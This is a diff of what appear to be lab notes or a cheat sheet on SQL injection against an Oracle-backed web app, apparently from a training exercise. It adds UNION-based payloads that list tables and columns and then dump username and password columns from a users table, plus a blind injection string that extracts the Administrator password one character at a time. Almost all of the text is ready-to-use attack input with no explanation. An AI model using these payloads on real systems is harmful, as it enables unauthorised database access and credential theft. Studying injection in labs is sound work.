@@ -46,6 +46,14 @@ SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
 
 Accessories' union select table_name, tablespace_name from all_tables --+
 
-Accessories' union select table_name, tablespace_name from all_tables where tablespace_name='USERS' --+
+Accessories' union select table_name, tablespace_name from all_tables where tablespace_name='SYSTEM' --+
 
 Accessories' union select column_name, table_name from all_tab_columns where table_name='PRODUCTS' --+
+
+Accessories' union select column_name, table_name from all_tab_columns where table_name='USERS_VTGQYL' --+
+
+Accessories' union select PASSWORD_DVUKPO, USERNAME_SVFNLT from USERS_VTGQYL --+
+
+
+Blind SQL Injection
+' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
